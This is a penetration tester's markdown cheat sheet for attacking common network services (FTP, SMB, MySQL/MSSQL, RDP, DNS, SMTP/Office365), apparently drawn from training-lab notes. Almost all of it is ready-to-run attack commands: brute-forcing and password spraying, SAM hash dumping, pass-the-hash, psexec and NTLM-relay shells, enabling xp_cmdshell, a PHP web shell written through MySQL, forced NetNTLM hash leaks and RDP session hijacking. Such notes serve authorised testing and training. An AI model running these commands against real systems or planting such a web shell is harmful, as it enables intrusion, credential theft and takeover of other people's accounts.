#network #ftp #smb #mssql #rdp #dns #smtp

# Attacking Common Services

FTP, SMB, SQL, RDP, DNS, Email. Related: [nmap](nmap.md) · [netexec](../AD/NetExec.md) · [mssql-sccm](../AD/mssql-sccm.md) · [password-attacks](../Passwords/password-attacks.md)

## Contents
- [FTP](#ftp)
- [SMB](#smb)
- [SQL (MySQL / MSSQL)](#sql-mysql--mssql)
- [RDP](#rdp)
- [DNS](#dns)
- [Email](#email)

## Quick Reference

| Service | Default Port(s) | Key Tools |
|---|---|---|
| FTP | 21/tcp | `hydra`, `ftp`, `nc` |
| SMB | 139, 445/tcp | `smbclient`, `smbmap`, `nxc`, `impacket-psexec`, `impacket-ntlmrelayx` |
| MySQL | 3306/tcp | `mysql` |
| MSSQL | 1433/tcp | `sqsh`, `xp_cmdshell` |
| RDP | 3389/tcp | `crowbar`, `xfreerdp`, `tscon` |
| DNS | 53/tcp+udp | `dig`, `subfinder` |
| SMTP | 25/tcp | `smtp-user-enum`, `swaks` |

## FTP
```bash
hydra -l user1 -P /usr/share/wordlists/rockyou.txt ftp://192.168.2.142
```
Brute-force FTP (also `ftp <ip>` / `nc -v <ip> 21` to connect).

## SMB
```bash
smbclient -N -L //10.129.14.128
```
Null-session share listing.

```bash
smbmap -H 10.129.14.128 -r notes --download "notes\note.txt"
```
Recursive enumeration + file download (`--upload` to write).

```bash
nxc smb 10.10.110.17 -u administrator -p 'Password123!' --sam
```
Dump the SAM database. See [netexec](../AD/NetExec.md).

```bash
nxc smb 10.10.110.17 -u Administrator -H 2B576ACBE6BCFDA7294D6BD18041B8FE
```
Pass-the-Hash authentication.

```bash
impacket-psexec administrator:'Password123!'@10.10.110.17
```
Get a shell over SMB.

```bash
impacket-ntlmrelayx --no-http-server -smb2support -t 10.10.110.146
```
Relay to dump the SAM (add `-c 'powershell -e <b64>'` for a shell). See [ntlm-relay](../AD/ntlm-relay.md).

## SQL (MySQL / MSSQL)
```bash
mysql -u julio -pPassword123 -h 10.129.20.13
```
Connect to MySQL.

```bash
sqsh -S 10.129.203.7 -U .\\julio -P 'MyPassword!' -h
```
Connect to MSSQL from Linux (Windows auth with `.\\`).

```sql
EXECUTE sp_configure 'xp_cmdshell', 1; RECONFIGURE; xp_cmdshell 'whoami'
```
Enable and run OS commands (MSSQL).[^1] See [mssql-sccm](../AD/mssql-sccm.md).

```sql
SELECT "<?php echo shell_exec($_GET['c']);?>" INTO OUTFILE '/var/www/html/webshell.php'
```
Write a web shell via MySQL.[^2]

```sql
EXEC master..xp_dirtree '\\10.10.110.17\share\'
```
Coerce the SQL account to leak its NetNTLM hash. See [ntlm-relay](../AD/ntlm-relay.md).

## RDP
```bash
crowbar -b rdp -s 192.168.220.142/32 -U users.txt -c 'password123'
```
Password spray RDP.

```bash
xfreerdp /v:192.168.2.141 /u:admin /pth:A9FDFA038C4B75EBC76DC855DD74F0DA
```
Pass-the-Hash to RDP.

> [!IMPORTANT]
> Requires SYSTEM privileges on the target host to hijack another user's session.

```cmd
tscon #{TARGET_SESSION_ID} /dest:#{OUR_SESSION_NAME}
```
Hijack another user's RDP session. See [lateral-movement](../Windows/lateral-movement.md).

## DNS
```bash
dig AXFR @ns1.inlanefreight.htb inlanefreight.htb
```
Attempt a zone transfer.

```bash
subfinder -d inlanefreight.com -v
```
Enumerate subdomains. See [web-recon](../Web/web-recon.md).

## Email
```bash
smtp-user-enum -M RCPT -U userlist.txt -D inlanefreight.htb -t 10.129.203.7
```
Enumerate SMTP users via RCPT.

```bash
python3 o365spray.py --spray -U usersfound.txt -p 'March2022!' --count 1 --lockout 1 --domain msplaintext.xyz
```
Password spray Office365 (`--enum` / `--validate` first).

```bash
swaks --from a@inlanefreight.com --to b@inlanefreight.com --header 'Subject: X' --body 'Y' --server 10.10.11.213
```
Test for SMTP open-relay.

[^1]: Requires `sysadmin` (or equivalent ALTER SETTINGS) privilege on the MSSQL instance.
[^2]: Requires an empty `secure_file_priv` (MySQL's file-write restriction) and write access to a web-served directory.
